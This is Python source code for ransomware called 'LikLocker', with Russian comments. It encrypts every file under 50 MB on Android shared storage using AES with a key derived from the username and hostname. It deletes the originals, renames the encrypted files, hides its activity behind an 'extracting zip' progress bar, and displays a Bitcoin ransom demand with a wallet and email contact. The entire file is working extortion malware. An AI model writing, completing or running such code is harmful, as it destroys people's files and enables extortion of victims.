import os
import base64
import hashlib
import getpass
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Функция для установки необходимых пакетов
def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Проверка и установка необходимых библиотек
def check_and_install(package):
    try:
        __import__(package)
    except ImportError:
        install(package)

# Проверяем и устанавливаем необходимые библиотеки
required_packages = ['pycryptodome', 'tqdm', 'pyfiglet', 'termcolor']
for package in required_packages:
    check_and_install(package)

# Импортируем библиотеки после их установки
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tqdm import tqdm
import pyfiglet
from termcolor import colored

def generate_key():
    username = getpass.getuser()
    hostname = os.uname()[1]
    unique_string = f"{username}{hostname}"
    return hashlib.sha256(unique_string.encode()).digest()

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    
    if len(plaintext) > 50 * 1024 * 1024:  # размер файла более 50 МБ
        return  # пропускаем файл с большим размером

    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    iv = cipher.iv
    
    encrypted_file_path = file_path + '.LikLock'
    
    # Записываем зашифрованный файл с инициализационным вектором
    with open(encrypted_file_path, 'wb') as file:
        file.write(iv + ciphertext)

    # Удаляем оригинальный файл после шифрования
    os.remove(file_path)
    
    # Переименовываем зашифрованный файл
    base64_encoded_name = base64.b64encode(os.path.basename(file_path).encode()).decode()
    os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), base64_encoded_name + '.LikLock'))
    
    return True

def encrypt_directory(directory, key):
    files_to_encrypt = []
    
    # Собирать все файлы для шифрования
    for root, _, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            if not filename.endswith('.LikLock'):
                files_to_encrypt.append(file_path)

    # Шифровать файлы с использованием многопоточности
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file_path, key): file_path for file_path in files_to_encrypt}
        
        with tqdm(total=len(futures), desc="extracting zip", unit="file") as pbar:
            for future in as_completed(futures):
                file_path = futures[future]
                try:
                    future.result()  # Получаем результат выполнения
                    pbar.set_postfix(file=file_path)
                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")  # Логирование ошибок
                pbar.update(1)

def display_warning():
    # Очистка экрана
    os.system('cls' if os.name == 'nt' else 'clear')

    # Генерация ASCII баннера
    ascii_banner = pyfiglet.figlet_format("LikLocker")
    colored_banner = colored(ascii_banner, color='red')
    print(colored_banner)

    # Текст предупреждения
    warning_text = "Bad news, all your important files have been encrypted by LikLocker ransomware! " \
                   "To decrypt your files, you need to download decryptor. " \
                   "To receive it, you need to send 0.005 BTC to the Bitcoin wallet A728E05dk04gsJ7H " \
                   "and write about successful payment to LikLockerRransomware@gmail.com " \
                   "and wait until they send you decryptor."

    border_length = len(warning_text) + 2  # длина текста + 2 для границ
    border = '.' * border_length  # граница из точек

    print(border)
    print(colored(f".{warning_text}.", color='red'))  # текст в границах
    print(border)

def main():
    directory = '/storage/emulated/0/'  # Заданный путь
    key = generate_key()  # Генерация уникального ключа для шифрования
    encrypt_directory(directory, key)
    print("Encryption completed.")
    display_warning()

if __name__ == "__main__":
    main()
